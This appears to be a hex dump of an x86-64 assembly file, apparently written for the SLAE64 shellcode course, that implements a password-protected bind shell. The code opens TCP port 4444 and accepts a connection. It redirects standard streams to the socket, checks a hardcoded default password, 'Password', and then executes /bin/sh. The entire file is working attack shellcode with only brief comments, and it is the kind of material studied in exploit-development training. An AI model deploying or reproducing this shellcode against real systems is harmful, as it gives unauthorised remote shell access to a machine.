00000000  3b 42 69 6e 64 5f 54 43  50 20 34 34 34 34 20 20  |;Bind_TCP 4444  |
00000010  77 69 74 68 20 70 61 73  73 77 6f 72 64 20 20 20  |with password   |
00000020  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000030  20 20 20 20 20 3b 0a 3b  44 65 66 61 75 6c 74 20  |     ;.;Default |
00000040  70 61 73 73 77 6f 72 64  20 3d 20 50 61 73 73 77  |password = Passw|
00000050  6f 72 64 20 20 20 20 20  20 20 20 20 20 20 20 20  |ord             |
00000060  20 20 20 20 20 20 20 20  20 20 20 20 3b 0a 3b 49  |            ;.;I|
00000070  66 20 63 6f 6e 6e 65 63  74 65 64 20 74 68 65 20  |f connected the |
00000080  73 68 65 6c 6c 63 6f 64  65 20 6e 6f 20 70 72 6f  |shellcode no pro|
00000090  6d 70 74 20 66 6f 72 20  70 61 73 73 77 6f 72 64  |mpt for password|
000000a0  20 20 20 3b 0a 3b 45 6e  74 65 72 20 70 61 73 73  |   ;.;Enter pass|
000000b0  77 6f 72 64 20 64 69 72  65 63 74 6c 79 20 61 6e  |word directly an|
000000c0  64 20 79 6f 75 20 67 65  74 20 74 68 65 20 62 69  |d you get the bi|
000000d0  6e 2f 73 68 20 73 68 65  6c 6c 3b 0a 3b 69 66 20  |n/sh shell;.;if |
000000e0  70 61 73 73 77 6f 72 64  20 69 73 20 77 72 6f 6e  |password is wron|
000000f0  67 20 74 68 65 20 73 68  65 6c 6c 63 6f 64 65 20  |g the shellcode |
00000100  65 78 69 74 3a 20 20 20  20 20 20 20 20 20 20 20  |exit:           |
00000110  20 3b 0a 3b 43 68 72 69  73 74 6f 70 68 65 20 47  | ;.;Christophe G|
00000120  20 53 4c 41 45 36 34 20  2d 20 31 33 33 37 20 73  | SLAE64 - 1337 s|
00000130  69 7a 65 20 31 37 33 20  62 79 74 65 73 20 20 20  |ize 173 bytes   |
00000140  20 20 20 20 20 20 20 20  3b 0a 0a 0a 0a 67 6c 6f  |        ;....glo|
00000150  62 61 6c 20 5f 73 74 61  72 74 0a 0a 0a 0a 5f 73  |bal _start...._s|
00000160  74 61 72 74 3a 0a 20 20  20 20 20 20 0a 0a 3b 20  |tart:.      ..; |
00000170  73 6f 63 6b 20 3d 20 73  6f 63 6b 65 74 28 41 46  |sock = socket(AF|
00000180  5f 49 4e 45 54 2c 20 53  4f 43 4b 5f 53 54 52 45  |_INET, SOCK_STRE|
00000190  41 4d 2c 20 30 29 0a 3b  20 41 46 5f 49 4e 45 54  |AM, 0).; AF_INET|
000001a0  20 3d 20 32 0a 3b 20 53  4f 43 4b 5f 53 54 52 45  | = 2.; SOCK_STRE|
000001b0  41 4d 20 3d 20 31 0a 3b  20 73 79 73 63 61 6c 6c  |AM = 1.; syscall|
000001c0  20 6e 75 6d 62 65 72 20  34 31 20 0a 0a 70 75 73  | number 41 ..pus|
000001d0  68 20 30 78 32 39 0a 70  6f 70 20 72 61 78 0a 70  |h 0x29.pop rax.p|
000001e0  75 73 68 20 30 78 32 0a  70 6f 70 20 72 64 69 0a  |ush 0x2.pop rdi.|
000001f0  70 75 73 68 20 30 78 31  0a 70 6f 70 20 72 73 69  |push 0x1.pop rsi|
00000200  0a 78 63 68 67 20 72 62  78 20 2c 20 72 64 78 0a  |.xchg rbx , rdx.|
00000210  73 79 73 63 61 6c 6c 0a  0a 3b 20 63 6f 70 79 20  |syscall..; copy |
00000220  73 6f 63 6b 65 74 20 64  65 73 63 72 69 70 74 6f  |socket descripto|
00000230  72 20 74 6f 20 72 64 69  20 66 6f 72 20 66 75 74  |r to rdi for fut|
00000240  75 72 65 20 75 73 65 20  0a 78 63 68 67 20 72 61  |ure use .xchg ra|
00000250  78 20 2c 20 72 64 69 0a  0a 0a 3b 20 73 65 72 76  |x , rdi...; serv|
00000260  65 72 2e 73 69 6e 5f 66  61 6d 69 6c 79 20 3d 20  |er.sin_family = |
00000270  41 46 5f 49 4e 45 54 20  0a 3b 20 73 65 72 76 65  |AF_INET .; serve|
00000280  72 2e 73 69 6e 5f 70 6f  72 74 20 3d 20 68 74 6f  |r.sin_port = hto|
00000290  6e 73 28 50 4f 52 54 29  0a 3b 20 73 65 72 76 65  |ns(PORT).; serve|
000002a0  72 2e 73 69 6e 5f 61 64  64 72 2e 73 5f 61 64 64  |r.sin_addr.s_add|
000002b0  72 20 3d 20 49 4e 41 44  44 52 5f 41 4e 59 0a 3b  |r = INADDR_ANY.;|
000002c0  20 62 7a 65 72 6f 28 26  73 65 72 76 65 72 2e 73  | bzero(&server.s|
000002d0  69 6e 5f 7a 65 72 6f 2c  20 38 29 0a 0a 78 6f 72  |in_zero, 8)..xor|
000002e0  20 72 61 78 2c 20 72 61  78 20 0a 0a 6d 6f 76 20  | rax, rax ..mov |
000002f0  64 77 6f 72 64 20 5b 72  73 70 20 2d 20 34 5d 20  |dword [rsp - 4] |
00000300  2c 20 65 61 78 0a 6d 6f  76 20 77 6f 72 64 20 5b  |, eax.mov word [|
00000310  72 73 70 20 2d 20 36 5d  20 2c 30 78 35 63 31 31  |rsp - 6] ,0x5c11|
00000320  0a 6d 6f 76 20 62 79 74  65 20 5b 72 73 70 20 2d  |.mov byte [rsp -|
00000330  20 38 5d 20 2c 20 30 78  32 0a 73 75 62 20 72 73  | 8] , 0x2.sub rs|
00000340  70 20 2c 20 38 0a 0a 0a  3b 20 62 69 6e 64 28 73  |p , 8...; bind(s|
00000350  6f 63 6b 2c 20 28 73 74  72 75 63 74 20 73 6f 63  |ock, (struct soc|
00000360  6b 61 64 64 72 20 2a 29  26 73 65 72 76 65 72 2c  |kaddr *)&server,|
00000370  20 73 6f 63 6b 61 64 64  72 5f 6c 65 6e 29 0a 3b  | sockaddr_len).;|
00000380  20 73 79 73 63 61 6c 6c  20 6e 75 6d 62 65 72 20  | syscall number |
00000390  34 39 0a 70 75 73 68 20  30 78 33 31 0a 70 6f 70  |49.push 0x31.pop|
000003a0  20 72 61 78 0a 6d 6f 76  20 72 73 69 2c 20 72 73  | rax.mov rsi, rs|
000003b0  70 0a 70 75 73 68 20 30  78 31 30 0a 70 6f 70 20  |p.push 0x10.pop |
000003c0  72 64 78 0a 73 79 73 63  61 6c 6c 0a 0a 0a 3b 20  |rdx.syscall...; |
000003d0  6c 69 73 74 65 6e 28 73  6f 63 6b 2c 20 4d 41 58  |listen(sock, MAX|
000003e0  5f 43 4c 49 45 4e 54 53  29 0a 3b 20 73 79 73 63  |_CLIENTS).; sysc|
000003f0  61 6c 6c 20 6e 75 6d 62  65 72 20 35 30 0a 0a 70  |all number 50..p|
00000400  75 73 68 20 30 78 33 32  0a 70 6f 70 20 72 61 78  |ush 0x32.pop rax|
00000410  0a 70 75 73 68 20 30 78  32 0a 70 6f 70 20 72 73  |.push 0x2.pop rs|
00000420  69 20 0a 73 79 73 63 61  6c 6c 0a 0a 0a 3b 20 6e  |i .syscall...; n|
00000430  65 77 20 3d 20 61 63 63  65 70 74 28 73 6f 63 6b  |ew = accept(sock|
00000440  2c 20 28 73 74 72 75 63  74 20 73 6f 63 6b 61 64  |, (struct sockad|
00000450  64 72 20 2a 29 26 63 6c  69 65 6e 74 2c 20 26 73  |dr *)&client, &s|
00000460  6f 63 6b 61 64 64 72 5f  6c 65 6e 29 0a 3b 20 73  |ockaddr_len).; s|
00000470  79 73 63 61 6c 6c 20 6e  75 6d 62 65 72 20 34 33  |yscall number 43|
00000480  0a 0a 0a 70 75 73 68 20  30 78 32 62 0a 70 6f 70  |...push 0x2b.pop|
00000490  20 72 61 78 0a 73 75 62  20 72 73 70 2c 20 30 78  | rax.sub rsp, 0x|
000004a0  31 30 0a 6d 6f 76 20 72  73 69 2c 20 72 73 70 0a  |10.mov rsi, rsp.|
000004b0  70 75 73 68 20 30 78 31  30 0a 6d 6f 76 20 72 64  |push 0x10.mov rd|
000004c0  78 2c 20 72 73 70 0a 0a  73 79 73 63 61 6c 6c 0a  |x, rsp..syscall.|
000004d0  0a 3b 20 73 74 6f 72 65  20 74 68 65 20 63 6c 69  |.; store the cli|
000004e0  65 6e 74 20 73 6f 63 6b  65 74 20 64 65 73 63 72  |ent socket descr|
000004f0  69 70 74 69 6f 6e 20 0a  6d 6f 76 20 72 39 2c 20  |iption .mov r9, |
00000500  72 61 78 20 0a 0a 3b 20  63 6c 6f 73 65 20 70 61  |rax ..; close pa|
00000510  72 65 6e 74 0a 70 75 73  68 20 30 78 33 0a 70 6f  |rent.push 0x3.po|
00000520  70 20 72 61 78 0a 73 79  73 63 61 6c 6c 0a 0a 0a  |p rax.syscall...|
00000530  0a 0a 0a 78 63 68 67 20  72 64 69 20 2c 20 72 39  |...xchg rdi , r9|
00000540  0a 78 6f 72 20 72 73 69  20 2c 20 72 73 69 0a 0a  |.xor rsi , rsi..|
00000550  64 75 70 32 3a 0a 20 20  20 20 70 75 73 68 20 30  |dup2:.    push 0|
00000560  78 32 31 0a 20 20 20 20  70 6f 70 20 72 61 78 0a  |x21.    pop rax.|
00000570  20 20 20 20 73 79 73 63  61 6c 6c 0a 20 20 20 20  |    syscall.    |
00000580  69 6e 63 20 72 73 69 0a  20 20 20 20 63 6d 70 20  |inc rsi.    cmp |
00000590  72 73 69 20 2c 20 30 78  32 0a 20 20 20 20 6c 6f  |rsi , 0x2.    lo|
000005a0  6f 70 6e 65 20 64 75 70  32 0a 0a 43 68 65 63 6b  |opne dup2..Check|
000005b0  50 61 73 73 3a 0a 20 20  20 20 78 6f 72 20 72 61  |Pass:.    xor ra|
000005c0  78 20 2c 20 72 61 78 0a  20 20 20 20 70 75 73 68  |x , rax.    push|
000005d0  20 30 78 31 30 0a 20 20  20 20 70 6f 70 20 72 64  | 0x10.    pop rd|
000005e0  78 0a 20 20 20 20 73 75  62 20 72 73 70 20 2c 20  |x.    sub rsp , |
000005f0  31 36 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |16              |
00000600  20 20 20 3b 20 31 36 20  62 79 74 65 73 20 74 6f  |   ; 16 bytes to|
00000610  20 72 65 63 65 69 76 65  20 75 73 65 72 20 69 6e  | receive user in|
00000620  70 75 74 20 0a 20 20 20  20 6d 6f 76 20 72 73 69  |put .    mov rsi|
00000630  20 2c 20 72 73 70 0a 20  20 20 20 78 6f 72 20 65  | , rsp.    xor e|
00000640  64 69 20 2c 20 65 64 69  0a 20 20 20 20 73 79 73  |di , edi.    sys|
00000650  63 61 6c 6c 20 20 20 20  20 20 20 20 20 20 20 20  |call            |
00000660  20 20 20 20 20 20 20 20  20 20 3b 20 73 79 73 74  |          ; syst|
00000670  65 6d 20 72 65 61 64 20  66 75 6e 63 74 69 6f 6e  |em read function|
00000680  20 63 61 6c 6c 0a 20 20  20 20 6d 6f 76 20 72 61  | call.    mov ra|
00000690  78 20 2c 20 30 78 36 34  37 32 36 66 37 37 37 33  |x , 0x64726f7773|
000006a0  37 33 36 31 35 30 20 3b  20 22 50 61 73 73 77 6f  |736150 ; "Passwo|
000006b0  72 64 22 0a 20 20 20 20  6c 65 61 20 72 64 69 20  |rd".    lea rdi |
000006c0  2c 20 5b 72 65 6c 20 72  73 69 5d 0a 20 20 20 20  |, [rel rsi].    |
000006d0  73 63 61 73 71 0a 20 20  20 20 6a 7a 20 45 78 65  |scasq.    jz Exe|
000006e0  63 76 65 0a 20 20 20 20  70 75 73 68 20 30 78 33  |cve.    push 0x3|
000006f0  63 0a 20 20 20 20 70 6f  70 20 72 61 78 0a 20 20  |c.    pop rax.  |
00000700  20 20 73 79 73 63 61 6c  6c 0a 0a 0a 0a 0a 0a 45  |  syscall......E|
00000710  78 65 63 76 65 3a 0a 20  20 20 20 78 6f 72 20 72  |xecve:.    xor r|
00000720  61 78 20 2c 20 72 61 78  0a 20 20 20 20 6d 6f 76  |ax , rax.    mov|
00000730  20 72 64 78 20 2c 20 72  61 78 20 0a 20 20 20 20  | rdx , rax .    |
00000740  70 75 73 68 20 72 61 78  0a 0a 20 20 20 20 6d 6f  |push rax..    mo|
00000750  76 20 72 62 78 2c 20 30  78 36 38 37 33 32 66 32  |v rbx, 0x68732f2|
00000760  66 36 65 36 39 36 32 32  66 0a 20 20 20 20 70 75  |f6e69622f.    pu|
00000770  73 68 20 72 62 78 0a 0a  20 20 20 20 3b 20 73 74  |sh rbx..    ; st|
00000780  6f 72 65 20 2f 62 69 6e  2f 2f 73 68 20 61 64 64  |ore /bin//sh add|
00000790  72 65 73 73 20 69 6e 20  52 44 49 0a 20 20 20 20  |ress in RDI.    |
000007a0  6d 6f 76 20 72 64 69 2c  20 72 73 70 0a 0a 20 20  |mov rdi, rsp..  |
000007b0  20 20 3b 20 53 65 63 6f  6e 64 20 4e 55 4c 4c 20  |  ; Second NULL |
000007c0  70 75 73 68 0a 20 20 20  20 70 75 73 68 20 72 61  |push.    push ra|
000007d0  78 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |x.              |
000007e0  20 20 0a 0a 20 20 20 20  3b 20 50 75 73 68 20 61  |  ..    ; Push a|
000007f0  64 64 72 65 73 73 20 6f  66 20 2f 62 69 6e 2f 2f  |ddress of /bin//|
00000800  73 68 0a 20 20 20 20 70  75 73 68 20 72 64 69 0a  |sh.    push rdi.|
00000810  0a 20 20 20 20 3b 20 73  65 74 20 52 53 49 0a 20  |.    ; set RSI. |
00000820  20 20 20 6d 6f 76 20 72  73 69 2c 20 72 73 70 0a  |   mov rsi, rsp.|
00000830  0a 20 20 20 20 3b 20 43  61 6c 6c 20 74 68 65 20  |.    ; Call the |
00000840  45 78 65 63 76 65 20 73  79 73 63 61 6c 6c 0a 20  |Execve syscall. |
00000850  20 20 20 70 75 73 68 20  30 78 33 62 0a 20 20 20  |   push 0x3b.   |
00000860  20 70 6f 70 20 72 61 78  0a 20 20 20 20 73 79 73  | pop rax.    sys|
00000870  63 61 6c 6c                                       |call|
00000874
